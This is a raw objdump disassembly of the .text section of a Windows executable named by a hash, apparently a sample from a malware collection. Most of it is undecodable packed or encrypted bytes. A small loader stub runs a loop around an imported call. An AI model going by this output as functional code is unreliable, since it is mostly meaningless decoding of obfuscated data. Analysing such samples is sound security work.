
a5aad8d71c84c93eca7e24681b41fb8a165e282d6eb5540c782245c830b096cb.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    eax,ds:0x413bde
  40100e:	mov    DWORD PTR [ebp-0x18],eax
  401011:	jmp    0x40141f
  401016:	adc    BYTE PTR [ebp+esi*8-0x5e940e36],0x54
  40101e:	(bad)  
  40101f:	shr    DWORD PTR ds:0x5a47e708,cl
  401025:	cmp    eax,0x7e7e7e7e
  40102a:	outs   dx,DWORD PTR ds:[esi]
  40102b:	jge    0x4010ab
  40102d:	jle    0x400ffd
  40102f:	xlat   BYTE PTR ds:[ebx]
  401030:	cmp    eax,0xcfd339d5
  401035:	rol    edx,1
  401037:	pop    es
  401038:	add    al,0x3
  40103a:	add    DWORD PTR [ebx],eax
  40103c:	add    BYTE PTR [edi],cl
  40103e:	xor    ecx,DWORD PTR [edi]
  401040:	rcr    BYTE PTR [eax],0xc7
  401043:	adc    BYTE PTR [edi],bl
  401045:	mov    ecx,0xddb70058
  40104a:	push   cs
  40104b:	out    dx,eax
  40104c:	mov    ebp,0x8e03d6db
  401051:	es mov esi,0x1541a2f4
  401057:	lods   eax,DWORD PTR ds:[esi]
  401058:	fiadd  WORD PTR [esi+0x1f]
  40105b:	data16 in al,dx
  40105d:	outs   dx,DWORD PTR ds:[esi]
  40105e:	or     edx,DWORD PTR [ecx]
  401060:	pushf  
  401061:	js     0x401039
  401063:	inc    eax
  401064:	stos   BYTE PTR es:[edi],al
  401065:	push   ebx
  401066:	sub    eax,0xad3cc4d1
  40106b:	mov    bh,BYTE PTR [ebx-0x3b]
  40106e:	stos   DWORD PTR es:[edi],eax
  40106f:	push   es
  401070:	(bad)  
  401071:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401077:	jmp    0x4010a9
  401079:	mov    ebp,ecx
  40107b:	dec    edi
  40107c:	out    0xa6,al
  40107e:	inc    ecx
  40107f:	call   DWORD PTR [edi-0x2556f868]
  401085:	mov    ebp,0x5536ed4d
  40108a:	and    esi,DWORD PTR [edx-0x43619116]
  401090:	jnp    0x4010a3
  401092:	ret    
  401093:	xchg   edx,eax
  401094:	and    esp,edx
  401096:	jmp    0x4010f6
  401098:	ret    0xb8e4
  40109b:	lock jmp 0xd765:0x74cf3192
  4010a3:	and    ch,cl
  4010a5:	add    bl,cl
  4010a7:	adc    DWORD PTR [ecx-0x5a],edx
  4010aa:	xor    eax,0x78616f03
  4010af:	or     BYTE PTR [ecx],dh
  4010b1:	fisttp QWORD PTR [esi+0x7f752854]
  4010b7:	(bad)
  4010bc:	or     ebx,DWORD PTR [ebx+0x55]
  4010bf:	fst    st(6)
  4010c1:	or     ebx,edx
  4010c3:	pop    esp
  4010c4:	fstp   DWORD PTR [ecx]
  4010c6:	jno    0x401066
  4010c8:	inc    esi
  4010c9:	dec    ebx
  4010ca:	aaa    
  4010cb:	adc    eax,0x1a29772b
  4010d0:	sar    DWORD PTR [esi],cl
  4010d2:	dec    edi
  4010d3:	call   0x530db5a4
  4010d8:	loopne 0x4010df
  4010da:	jmp    0xc8e3:0x43e8afb8
  4010e1:	aaa    
  4010e2:	or     eax,0x81c843c4
  4010e7:	shl    eax,0x40
  4010ea:	fs or  al,0xa2
  4010ed:	daa    
  4010ee:	adc    cl,BYTE PTR [ecx+0x19a7887b]
  4010f4:	test   eax,0x84508903
  4010f9:	mov    eax,0x76301729
  4010fe:	push   esi
  4010ff:	shl    DWORD PTR es:0x79bc16be,cl
  401106:	sbb    bh,ah
  401108:	push   ebp
  401109:	mov    cl,0x80
  40110b:	in     eax,0x9
  40110d:	call   0x14938111
  401112:	mov    eax,0x860c7ec9
  401117:	retf   
  401118:	add    ebp,esi
  40111a:	pop    ebp
  40111b:	int    0x52
  40111d:	xlat   BYTE PTR ds:[ebx]
  40111e:	imul   ebp,eax,0xffffffbf
  401121:	mov    ah,al
  401123:	dec    eax
  401124:	fisub  DWORD PTR ds:0x61896a8c
  40112a:	scas   eax,DWORD PTR es:[edi]
  40112b:	das    
  40112c:	cmp    al,0xc6
  40112e:	cmp    al,0x14
  401130:	stos   DWORD PTR es:[edi],eax
  401131:	hlt    
  401132:	leave  
  401133:	fs ja  0x401144
  401136:	mov    eax,ds:0xa36b5f98
  40113b:	lods   al,BYTE PTR ds:[esi]
  40113c:	nop
  40113d:	and    eax,0x915c361f
  401142:	and    BYTE PTR [edi],al
  401144:	ficom  DWORD PTR [ecx-0xb097898]
  40114a:	stos   BYTE PTR es:[edi],al
  40114b:	pop    edx
  40114c:	iret   
  40114d:	jne    0x401120
  40114f:	das    
  401150:	outs   dx,DWORD PTR ds:[esi]
  401151:	stos   DWORD PTR es:[edi],eax
  401152:	sub    dl,BYTE PTR [edx]
  401154:	mov    ebp,0xa046803e
  401159:	retf   0x8e5d
  40115c:	in     eax,0x2e
  40115e:	lds    ebx,FWORD PTR [ecx+0xe]
  401161:	pop    eax
  401162:	pop    es
  401163:	dec    eax
  401164:	sbb    edi,eax
  401166:	mov    esp,0x8fba9b38
  40116b:	push   ebx
  40116c:	xchg   esi,eax
  40116d:	mov    cl,0x23
  40116f:	retf   0xd705
  401172:	sub    eax,0x9514864d
  401177:	jbe    0x4011db
  401179:	ret    
  40117a:	xor    al,0x41
  40117c:	mov    edx,0xfa7fc5a5
  401181:	xchg   edx,eax
  401182:	shl    bh,1
  401184:	or     BYTE PTR [ecx-0xf],0x5e
  401188:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401189:	fmul   DWORD PTR [edi]
  40118b:	test   DWORD PTR [eax],ebx
  40118d:	out    0x22,al
  40118f:	ss mov dl,0x24
  401192:	cmp    eax,0x2153d44c
  401197:	call   0xd125641c
  40119c:	pop    ebx
  40119d:	data16 jbe 0x40117b
  4011a0:	xchg   esi,eax
  4011a1:	mov    ah,0xcf
  4011a3:	sti    
  4011a4:	mov    bh,0x85
  4011a6:	and    edi,DWORD PTR es:[ecx]
  4011a9:	(bad)  
  4011aa:	fidivr WORD PTR [edx]
  4011ac:	in     eax,dx
  4011ad:	cmp    dh,BYTE PTR [edx]
  4011af:	push   es
  4011b0:	jmp    0x4011ab
  4011b2:	ret    
  4011b3:	and    al,0xfc
  4011b5:	and    edi,edx
  4011b7:	mov    dl,0xdf
  4011b9:	cmp    al,0x31
  4011bb:	sbb    ebx,edi
  4011bd:	fnstsw WORD PTR [edi-0x5fb698d]
  4011c3:	std    
  4011c4:	ins    BYTE PTR es:[edi],dx
  4011c5:	sbb    eax,0x89661e1d
  4011ca:	pop    esi
  4011cb:	push   esi
  4011cc:	jmp    0x40115f
  4011ce:	jl     0x401214
  4011d0:	push   ebx
  4011d1:	std    
  4011d2:	pop    eax
  4011d3:	xor    DWORD PTR ds:0x7264e301,esp
  4011d9:	jbe    0x401251
  4011db:	(bad)  
  4011dc:	fcom   QWORD PTR [ebx]
  4011de:	jbe    0x40123f
  4011e0:	and    esi,ecx
  4011e2:	pusha  
  4011e3:	stc    
  4011e4:	mov    al,ds:0x3c0f32d6
  4011e9:	mov    dh,0x52
  4011eb:	ror    DWORD PTR [ecx],1
  4011ed:	rol    DWORD PTR [ecx],1
  4011ef:	jl     0x401215
  4011f1:	sub    BYTE PTR [eax],0x63
  4011f4:	loopne 0x4011e8
  4011f6:	addr16 daa 
  4011f8:	in     al,0x7
  4011fa:	mov    eax,0x300be420
  4011ff:	mov    dl,ah
  401201:	or     eax,0x3dcd2390
  401206:	cmp    BYTE PTR [esi],bl
  401208:	cmp    dl,dh
  40120a:	fcomip st,st(0)
  40120c:	aaa    
  40120d:	test   al,0x99
  40120f:	fld    TBYTE PTR [edx-0x61]
  401212:	xchg   edi,eax
  401213:	adc    DWORD PTR [edi-0xd],edi
  401216:	ret    
  401217:	mov    ebp,0x81f3e477
  40121c:	sbb    esp,esp
  40121e:	popf   
  40121f:	call   0x6c14900e
  401224:	test   eax,0x3351b26b
  401229:	out    dx,al
  40122a:	ss pushf 
  40122c:	xchg   ebx,eax
  40122d:	jmp    0x4757:0xeb37e209
  401234:	mov    ecx,0x9f80897b
  401239:	pushf  
  40123a:	in     eax,0x86
  40123c:	mov    DWORD PTR [edi+0x7b],edi
  40123f:	js     0x401284
  401241:	and    dh,al
  401243:	in     al,0x26
  401245:	in     eax,0x1
  401247:	xchg   esi,eax
  401248:	mov    al,0x88
  40124a:	mov    WORD PTR [eax],fs
  40124c:	mov    eax,ds:0x929ad1ec
  401251:	mov    dl,0x29
  401253:	test   BYTE PTR [esi+0x38c572d2],0xee
  40125a:	bound  edx,QWORD PTR [esi+0x41009481]
  401260:	pop    es
  401261:	and    BYTE PTR [esi-0x30],dl
  401264:	xchg   esi,eax
  401265:	scas   al,BYTE PTR es:[edi]
  401266:	jmp    0x9d6e:0x1d35df25
  40126d:	sbb    BYTE PTR [esi-0x26a61704],0xbd
  401274:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401275:	rcr    DWORD PTR [ebx],1
  401277:	pop    edx
  401278:	cmp    al,0xdb
  40127a:	add    cl,BYTE PTR [edx+0x5b57e1a2]
  401280:	dec    edi
  401281:	test   eax,0xf6abb01a
  401286:	shr    DWORD PTR cs:[eax],0xb0
  40128a:	das    
  40128b:	fisttp QWORD PTR [esi]
  40128d:	repz sub ah,BYTE PTR [esi+0x2b]
  401291:	dec    ebx
  401292:	mov    esi,0x6da1bb70
  401297:	jno    0x4012b7
  401299:	xor    ebx,DWORD PTR [ebx+0x2d563d4e]
  40129f:	jp     0x401265
  4012a1:	loop   0x401235
  4012a3:	jb     0x401314
  4012a5:	retf   0xb26c
  4012a8:	xchg   ebp,eax
  4012a9:	mov    ss,ebp
  4012ab:	aam    0xe6
  4012ad:	add    eax,0x4e7fe323
  4012b2:	sbb    al,0x45
  4012b4:	fs in  al,dx
  4012b6:	test   al,0x3e
  4012b8:	pop    ds
  4012b9:	fwait
  4012ba:	adc    BYTE PTR [edx+0x1e],dh
  4012bd:	aam    0x9f
  4012bf:	ss inc edi
  4012c1:	pushf  
  4012c2:	cdq    
  4012c3:	je     0x401270
  4012c5:	mov    eax,0x54f73acd
  4012ca:	out    0x51,eax
  4012cc:	sub    edi,DWORD PTR [edi]
  4012ce:	je     0x4012e7
  4012d0:	and    ah,dh
  4012d2:	mov    eax,0x5a81b7a6
  4012d7:	or     al,0xba
  4012d9:	js     0x4012b5
  4012db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012dc:	jbe    0x4012cd
  4012de:	pop    ss
  4012df:	es mov dl,0xbe
  4012e2:	pop    esi
  4012e3:	sbb    BYTE PTR [ebp-0x5c0f81b5],dh
  4012e9:	outs   dx,DWORD PTR ds:[esi]
  4012ea:	retf   0x4248
  4012ed:	mov    esp,0xc9f3de3b
  4012f2:	div    BYTE PTR [eax+0x17]
  4012f5:	mov    DWORD PTR [ebx+0x63940fc3],esp
  4012fb:	xchg   esp,eax
  4012fc:	test   DWORD PTR [ebp+edx*2-0x53],ebp
  401300:	fld    DWORD PTR [ecx+0x684c3034]
  401306:	retf   
  401307:	jecxz  0x4012d8
  401309:	add    DWORD PTR [ebx+ebx*4+0x64],ebp
  40130d:	arpl   WORD PTR [edi-0xf02a5e5],ax
  401313:	sub    eax,0x9f377ec3
  401318:	loop   0x40132a
  40131a:	dec    esp
  40131b:	dec    esp
  40131c:	mov    edi,0x830e6620
  401321:	sub    dh,cl
  401323:	add    al,0xb0
  401325:	sub    al,0xe9
  401327:	push   esi
  401328:	call   0xdbca:0x5dde3984
  40132f:	pop    ebx
  401330:	aad    0xfe
  401332:	lock gs mov bh,0x68
  401336:	loop   0x401379
  401338:	repz int 0x7
  40133b:	cmp    al,0x99
  40133d:	or     BYTE PTR [ebx-0x52],ch
  401340:	sub    BYTE PTR [esp+eax*8-0x52],ah
  401344:	(bad)  [ecx]
  401346:	jmp    0x40132b
  401348:	mov    ds:0xdf4018a0,al
  40134d:	dec    eax
  40134e:	add    eax,0xe9850064
  401353:	jge    0x4013aa
  401355:	or     esp,esp
  401357:	in     eax,0x8
  401359:	push   eax
  40135a:	cmc    
  40135b:	call   0xc77899bc
  401360:	outs   dx,DWORD PTR ds:[esi]
  401361:	in     eax,dx
  401362:	mov    dl,0xbd
  401364:	adc    eax,0xd36819b3
  401369:	ret    0x945c
  40136c:	jmp    0x401342
  40136e:	mov    ch,ah
  401370:	jbe    0x40138e
  401372:	or     al,0x14
  401374:	call   0x7b0c1b72
  401379:	push   esp
  40137a:	cdq    
  40137b:	fdiv   QWORD PTR [ebp-0x56]
  40137e:	pop    ds
  40137f:	mov    esp,0x20320576
  401384:	jmp    0x40131a
  401386:	jns    0x401328
  401388:	rcl    esp,cl
  40138a:	in     al,0x98
  40138c:	jmp    0x56b8:0x942d99fa
  401393:	push   ss
  401394:	xor    eax,0xa6a17407
  401399:	push   0xffffffc1
  40139b:	mov    ebp,DWORD PTR es:[edi+edx*1]
  40139f:	sbb    al,0x21
  4013a1:	inc    ecx
  4013a2:	sbb    ch,BYTE PTR [ebx]
  4013a4:	pop    ebp
  4013a5:	or     edx,DWORD PTR [eax+0x2479dbd]
  4013ab:	push   ecx
  4013ac:	xchg   ebp,eax
  4013ad:	jae    0x40137e
  4013af:	pusha  
  4013b0:	cmp    BYTE PTR [esi-0x3395a130],0x2b
  4013b7:	sbb    ecx,DWORD PTR [eax+0x585a264e]
  4013bd:	or     eax,0xb1e9d638
  4013c2:	mov    ecx,0xdb3f525b
  4013c7:	popa   
  4013c8:	adc    DWORD PTR [ecx],ebx
  4013ca:	rcl    BYTE PTR [eax],1
  4013cc:	inc    ecx
  4013cd:	ret    0xfd9f
  4013d0:	push   esp
  4013d1:	lock sahf 
  4013d3:	cwde   
  4013d4:	(bad)  
  4013d5:	or     eax,0x4a082c5b
  4013da:	inc    esp
  4013db:	int3   
  4013dc:	xchg   BYTE PTR [ebx],dl
  4013de:	shl    DWORD PTR [ebx-0x1],0x69
  4013e2:	add    eax,0xfee75e76
  4013e7:	gs (bad) 
  4013e9:	loope  0x4013c8
  4013eb:	xlat   BYTE PTR ds:[ebx]
  4013ec:	sub    BYTE PTR [esp+ebp*1+0x32],ch
  4013f0:	mov    edi,0x59c05033
  4013f5:	sub    BYTE PTR [esi-0x50],0x40
  4013f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013fa:	push   es
  4013fb:	arpl   WORD PTR [ecx-0x18],sp
  4013fe:	push   ss
  4013ff:	mov    ecx,esi
  401401:	xor    BYTE PTR [ecx+0x1c727e7c],cl
  401407:	popa   
  401408:	push   edi
  401409:	sub    cl,BYTE PTR [ebx+0x2b21f806]
  40140f:	sub    DWORD PTR [eax],esp
  401411:	jle    0x40140b
  401413:	not    DWORD PTR [ecx]
  401415:	addr16 dec esp
  401417:	adc    cl,BYTE PTR [esi]
  401419:	fcomp  DWORD PTR [eax+0xf903837]
  40141f:	mov    eax,ds:0x413cee
  401424:	mov    DWORD PTR [ebp-0x48],eax
  401427:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40142e:	adc    eax,0x6013
  401433:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  40143a:	adc    eax,ecx
  40143c:	mov    eax,DWORD PTR [ebp-0x10]
  40143f:	mov    ecx,DWORD PTR ds:0x43364b
  401445:	mov    ecx,DWORD PTR [ecx]
  401447:	or     DWORD PTR ds:0x433673,ecx
  40144d:	push   ebx
  40144e:	push   esi
  40144f:	sbb    DWORD PTR ds:0x4336eb,edi
  401455:	mov    esi,0x7510854
  40145a:	movzx  ecx,BYTE PTR ds:0x4336f3
  401461:	sbb    DWORD PTR ds:0x4336ef,ecx
  401467:	xor    eax,esi
  401469:	and    ebx,ecx
  40146b:	push   edi
  40146c:	mov    DWORD PTR ds:0x433743,0x1c
  401476:	cmp    DWORD PTR ds:0x433743,0x0
  40147d:	je     0x4014ab
  401483:	cmp    DWORD PTR ds:0x433743,0x25
  40148a:	jne    0x401499
  401490:	push   DWORD PTR [ebp-0x20]
  401493:	call   DWORD PTR ds:0x412288
  401499:	mov    ebx,DWORD PTR ds:0x433743
  40149f:	dec    ebx
  4014a0:	mov    DWORD PTR ds:0x433743,ebx
  4014a6:	jmp    0x401476
  4014ab:	mov    edi,0x32729b
  4014b0:	jmp    0x4018be
  4014b5:	xchg   ecx,eax
  4014b6:	mov    ds:0x59f479c4,eax
  4014bb:	push   ecx
  4014bc:	mov    bl,0x68
  4014be:	push   ebp
  4014bf:	out    dx,eax
  4014c0:	xor    ebp,DWORD PTR [ebp+0x6f7fe993]
  4014c6:	jge    0x401546
  4014c8:	jle    0x401539
  4014ca:	jge    0x40154a
  4014cc:	jle    0x4014b4
  4014ce:	lea    eax,[esi]
  4014d0:	(bad)  
  4014d2:	xor    esp,DWORD PTR [esi+0x7f81641]
  4014d8:	mov    eax,0xa6bb360e
  4014dd:	inc    esi
  4014de:	cmp    bl,BYTE PTR [esp+ecx*1]
  4014e1:	sbb    DWORD PTR [esi],esi
  4014e3:	popf   
  4014e4:	pop    ss
  4014e5:	xor    BYTE PTR [ebp+0x71],bh
  4014e8:	ret    
  4014e9:	punpckldq mm4,DWORD PTR [eax+0x5281d9a8]
  4014f0:	mov    edi,DWORD PTR [edx+0x4f]
  4014f3:	xor    ebp,DWORD PTR [eax]
  4014f5:	adc    BYTE PTR [eax+0x2e],cl
  4014f8:	retf   0xdef9
  4014fb:	mov    esi,0x78427321
  401500:	popa   
  401501:	push   ss
  401502:	mov    WORD PTR [ebx],gs
  401504:	push   cs
  401505:	ja     0x40154c
  401507:	mov    esp,0x9b657e5
  40150c:	xor    ah,bl
  40150e:	inc    edx
  40150f:	ror    BYTE PTR [ebp+0x57f17bf],0x1a
  401516:	repz and esp,edx
  401519:	add    DWORD PTR [ecx+0x33df9ee5],edi
  40151f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401520:	neg    BYTE PTR [ebx]
  401522:	in     eax,0x4e
  401524:	icebp  
  401525:	sti    
  401526:	test   bh,dh
  401528:	ins    DWORD PTR es:[edi],dx
  401529:	stos   BYTE PTR es:[edi],al
  40152a:	data16 js 0x401561
  40152d:	mov    ebp,0x91de13cb
  401532:	mov    al,0xa
  401534:	xchg   esi,ebx
  401536:	popf   
  401537:	fs ja  0x401597
  40153a:	mov    al,ds:0x2286ac13
  40153f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401540:	cli    
  401541:	xor    edi,DWORD PTR [edx-0x2aaa0085]
  401547:	xchg   esp,eax
  401548:	xlat   BYTE PTR ds:[ebx]
  401549:	in     al,dx
  40154a:	lock js 0x401518
  40154d:	mov    ds:0x58ac9652,eax
  401552:	add    ah,BYTE PTR ds:0x6090390b
  401558:	outs   dx,DWORD PTR ds:[esi]
  401559:	repnz int 0x7a
  40155c:	std    
  40155d:	jge    0x40157a
  40155f:	dec    edi
  401560:	int    0x50
  401562:	dec    ebp
  401563:	xlat   BYTE PTR ds:[ebx]
  401564:	push   edx
  401565:	dec    edi
  401566:	nop
  401567:	jg     0x40150f
  401569:	cmp    DWORD PTR [ebx-0x63],esp
  40156c:	push   0xffffff97
  40156e:	lds    ecx,FWORD PTR [esi+0xb]
  401571:	mov    edx,0x3eb13fd5
  401576:	inc    edx
  401577:	and    bh,BYTE PTR [ecx-0x4]
  40157a:	es cmp ch,cl
  40157d:	mov    bl,0x4a
  40157f:	clc    
  401580:	xor    DWORD PTR [edi+0x7c],eax
  401583:	inc    ecx
  401584:	cwde   
  401585:	sbb    esi,DWORD PTR [eax-0x44637ea1]
  40158b:	pop    ds
  40158c:	in     al,0x1
  40158e:	mov    dl,0x34
  401590:	and    al,0x38
  401592:	stos   BYTE PTR es:[edi],al
  401593:	add    eax,0x4a1e0328
  401598:	or     al,0x5c
  40159a:	mov    esi,0x63d8efbc
  40159f:	sub    ecx,DWORD PTR [ebx+0x25]
  4015a2:	out    dx,al
  4015a3:	fist   WORD PTR [ebp-0x55]
  4015a6:	xchg   ebp,eax
  4015a7:	jb     0x401609
  4015a9:	push   es
  4015aa:	xchg   ecx,eax
  4015ab:	sub    BYTE PTR ds:0xe39f53e2,dh
  4015b1:	push   ebx
  4015b2:	jmp    0xf0b200b
  4015b7:	scas   al,BYTE PTR es:[edi]
  4015b8:	repz push edx
  4015ba:	jmp    0x401639
  4015bc:	sbb    cl,dh
  4015be:	mov    cl,0xa3
  4015c0:	es push esp
  4015c2:	mov    ebx,0x48272f71
  4015c7:	bound  eax,QWORD PTR [ebx+0x122f561d]
  4015cd:	(bad)  
  4015ce:	lods   al,BYTE PTR ds:[esi]
  4015cf:	xchg   ah,bl
  4015d1:	(bad)  
  4015d2:	dec    edx
  4015d3:	lea    edx,[ecx-0xa92b1f0]
  4015d9:	dec    edi
  4015da:	mov    eax,ds:0x197586b7
  4015df:	push   0x70
  4015e1:	in     eax,0x88
  4015e3:	shl    bh,0xf
  4015e6:	icebp  
  4015e7:	sbb    ecx,ebx
  4015e9:	sub    eax,0xe50b5575
  4015ee:	std    
  4015ef:	add    al,BYTE PTR gs:[ebx+0x95d69cd]
  4015f6:	leave  
  4015f7:	lds    esi,FWORD PTR [esi]
  4015f9:	push   eax
  4015fa:	fsubr  DWORD PTR ss:[eax]
  4015fd:	ja     0x4015e6
  4015ff:	dec    ebp
  401600:	adc    al,0x84
  401602:	data16 jno 0x40165c
  401605:	mov    eax,ds:0xf5e9b19b
  40160a:	retf   0xde58
  40160d:	cmc    
  40160e:	jb     0x401598
  401610:	xchg   edx,eax
  401611:	cwde   
  401612:	out    0xfd,al
  401614:	cwde   
  401615:	pop    eax
  401616:	sbb    BYTE PTR [ebx-0x3c],cl
  401619:	mov    bl,0x3
  40161b:	mov    bh,0x5b
  40161d:	stos   DWORD PTR es:[edi],eax
  40161e:	js     0x401692
  401620:	dec    edx
  401621:	out    dx,eax
  401622:	rcr    BYTE PTR [esi-0x47],cl
  401625:	adc    al,0x5d
  401627:	ret    0x7355
  40162a:	mov    BYTE PTR [edx],cl
  40162c:	jp     0x401600
  40162e:	out    0xde,eax
  401630:	push   edi
  401631:	pop    edi
  401632:	dec    esi
  401633:	enter  0x1c0d,0x9b
  401637:	jae    0x4015c5
  401639:	ja     0x4015de
  40163b:	setae  BYTE PTR [ecx]
  40163e:	in     al,dx
  40163f:	mov    eax,ds:0x9a13d7aa
  401644:	xchg   esi,eax
  401645:	push   0x76
  401647:	clc    
  401648:	lea    edi,ss:[edx-0x2f]
  40164c:	xor    eax,0xf34baf0a
  401651:	push   0xffffffb8
  401653:	push   ss
  401654:	adc    DWORD PTR [ecx+eax*1],eax
  401657:	jmp    0x4015eb
  401659:	stos   DWORD PTR es:[edi],eax
  40165a:	cmp    ah,al
  40165c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40165d:	loopne 0x4016a3
  40165f:	retf   0xa105
  401662:	add    DWORD PTR [edx+0x33],ebx
  401665:	call   FWORD PTR [ecx+0x26]
  401668:	jp     0x40169e
  40166a:	inc    ebp
  40166b:	xchg   edx,eax
  40166c:	in     al,0x46
  40166e:	xor    ah,dl
  401670:	pop    es
  401671:	loopne 0x401649
  401673:	int    0x2d
  401675:	or     ch,BYTE PTR [esp+edx*4]
  401678:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401679:	(bad)  
  40167a:	pop    esi
  40167b:	das    
  40167c:	pop    ss
  40167d:	jmp    0x40169a
  40167f:	neg    DWORD PTR [edx-0x15cf72c]
  401685:	out    0x99,eax
  401687:	(bad)  
  401688:	bound  ebp,QWORD PTR [edx+0x43]
  40168b:	fist   DWORD PTR [esi-0x11]
  40168e:	int    0x86
  401690:	jecxz  0x4016d9
  401692:	or     BYTE PTR [edx],cl
  401694:	fwait
  401695:	push   edx
  401696:	sbb    DWORD PTR [ebx+0x38],esi
  401699:	sbb    eax,0x6a4bae1c
  40169e:	mov    edi,cs
  4016a0:	adc    dh,ch
  4016a2:	std    
  4016a3:	jbe    0x40171f
  4016a5:	mov    WORD PTR [edi-0x295c40b2],fs
  4016ab:	loop   0x401696
  4016ad:	or     al,0x8
  4016af:	lds    eax,FWORD PTR ds:0x15755d91
  4016b5:	mov    ds:0xbe7110ee,al
  4016ba:	fisubr WORD PTR [esi-0xc345926]
  4016c0:	clc    
  4016c1:	xchg   ebx,eax
  4016c2:	ss pusha 
  4016c4:	ret    
  4016c5:	ins    BYTE PTR es:[edi],dx
  4016c6:	xchg   ebp,eax
  4016c7:	jae    0x401693
  4016c9:	int3   
  4016ca:	clc    
  4016cb:	push   ebp
  4016cc:	pop    ecx
  4016cd:	fild   DWORD PTR [edx]
  4016cf:	adc    esp,DWORD PTR [edx+0x28]
  4016d2:	push   ss
  4016d3:	push   ebp
  4016d4:	fisttp WORD PTR ds:0xd26a0877
  4016da:	add    ah,al
  4016dc:	jbe    0x4016fd
  4016de:	cld    
  4016df:	out    dx,al
  4016e0:	adc    DWORD PTR [ebx-0xc],edi
  4016e3:	push   esi
  4016e4:	sub    DWORD PTR [ebx-0x6b],ebx
  4016e7:	push   ds
  4016e8:	xlat   BYTE PTR ds:[ebx]
  4016e9:	push   edx
  4016ea:	out    0xe6,eax
  4016ec:	out    dx,eax
  4016ed:	cld    
  4016ee:	adc    eax,0xc3bcb176
  4016f3:	xchg   esi,eax
  4016f4:	cs scas al,BYTE PTR es:[edi]
  4016f6:	and    al,0xc7
  4016f8:	sbb    BYTE PTR [ecx+0x5e7ffa5f],ah
  4016fe:	int    0x8
  401700:	rcr    BYTE PTR [ebx],1
  401702:	ds sbb edx,eax
  401705:	or     ebx,DWORD PTR [edx+0x3b]
  401708:	fsub   DWORD PTR [esi-0x769629b0]
  40170e:	nop
  40170f:	mov    ds:0x2274d295,al
  401714:	in     eax,dx
  401715:	mov    dl,0xe1
  401717:	push   edi
  401718:	imul   ecx,DWORD PTR [edi-0x5d],0x4d03533d
  40171f:	add    eax,0x5aae14ee
  401724:	xor    eax,0xdd34b452
  401729:	xlat   BYTE PTR ds:[ebx]
  40172a:	and    ebx,DWORD PTR [edx-0x7a860f59]
  401730:	cmp    esi,DWORD PTR [edx-0x16c9234b]
  401736:	imul   esi,DWORD PTR ds:0xe5817ebf,0xffffff87
  40173d:	dec    eax
  40173e:	repz and BYTE PTR [esi-0x4a2efeba],al
  401745:	xchg   edi,eax
  401746:	outs   dx,DWORD PTR ds:[esi]
  401747:	or     edi,DWORD PTR [edi+0x3e58b178]
  40174d:	jns    0x401717
  40174f:	fwait
  401750:	je     0x401734
  401752:	lahf   
  401753:	jno    0x4017ac
  401755:	clc    
  401756:	loop   0x40175d
  401758:	push   cs
  401759:	out    dx,al
  40175a:	fdivr  QWORD PTR [edx-0x4b]
  40175d:	add    DWORD PTR [eax-0x22],ebp
  401760:	adc    eax,0xdc669386
  401765:	ins    DWORD PTR es:[edi],dx
  401766:	jg     0x401740
  401768:	icebp  
  401769:	in     al,dx
  40176a:	mov    dl,0xfa
  40176c:	sbb    DWORD PTR [ecx+ebx*8],eax
  40176f:	jb     0x4017ca
  401771:	jo     0x401764
  401773:	jb     0x401779
  401775:	shrd   DWORD PTR [ebx-0x7cc14cfa],edx,cl
  40177c:	inc    edx
  40177d:	cmp    al,0x75
  40177f:	xor    eax,0xf43f5779
  401784:	cdq    
  401785:	nop
  401786:	xchg   ebp,eax
  401787:	(bad)  
  401788:	cmp    BYTE PTR [ebx],bh
  40178a:	sbb    eax,0x5fecfe9e
  40178f:	add    edi,DWORD PTR [esi+0x62]
  401792:	jl     0x40179f
  401794:	out    0x74,al
  401796:	pusha  
  401797:	scas   eax,DWORD PTR es:[edi]
  401798:	inc    ecx
  401799:	mov    bl,0x94
  40179b:	cmp    ch,dh
  40179d:	push   ebx
  40179e:	add    ah,BYTE PTR [ecx+ecx*4]
  4017a1:	scas   eax,DWORD PTR es:[edi]
  4017a2:	add    dh,dh
  4017a4:	pop    esp
  4017a5:	jl     0x40174d
  4017a7:	dec    edx
  4017a8:	add    BYTE PTR [ebx],al
  4017aa:	imul   esp,DWORD PTR [ebp-0x7de1df22],0x1544f500
  4017b4:	ret    0x8086
  4017b7:	dec    ebx
  4017b8:	ss ja  0x4017b7
  4017bb:	mov    esp,0x6c1895e5
  4017c0:	adc    al,0x39
  4017c2:	mov    ch,0xcb
  4017c4:	push   0x62
  4017c6:	sub    al,0xda
  4017c8:	gs pop ebx
  4017ca:	retf   0xba59
  4017cd:	dec    eax
  4017ce:	sbb    ebx,DWORD PTR [ecx+ebx*1+0x493e6074]
  4017d5:	push   esp
  4017d6:	lods   al,BYTE PTR ds:[esi]
  4017d7:	jnp    0x4017e2
  4017d9:	add    BYTE PTR [edi-0x60],ah
  4017dc:	and    al,0x13
  4017de:	adc    DWORD PTR [esi-0x6211c658],eax
  4017e4:	sbb    ch,0x1b
  4017e7:	repnz xchg ecx,eax
  4017e9:	inc    ebp
  4017ea:	push   edi
  4017eb:	pop    esp
  4017ec:	and    DWORD PTR [esi],ebx
  4017ee:	cdq    
  4017ef:	test   DWORD PTR [eax-0x57],esi
  4017f2:	das    
  4017f3:	cmp    BYTE PTR [edi+edx*1],ah
  4017f6:	or     al,BYTE PTR [esp+edx*2+0x4d281e4a]
  4017fd:	xchg   ebp,eax
  4017fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017ff:	fwait
  401800:	or     eax,0xca4eb404
  401805:	aad    0xdd
  401807:	ins    DWORD PTR es:[edi],dx
  401808:	inc    eax
  401809:	cmp    eax,0x3768fb38
  40180e:	mov    gs,WORD PTR [ecx]
  401810:	mov    DWORD PTR [eax],edx
  401812:	inc    eax
  401813:	mov    dl,0x6d
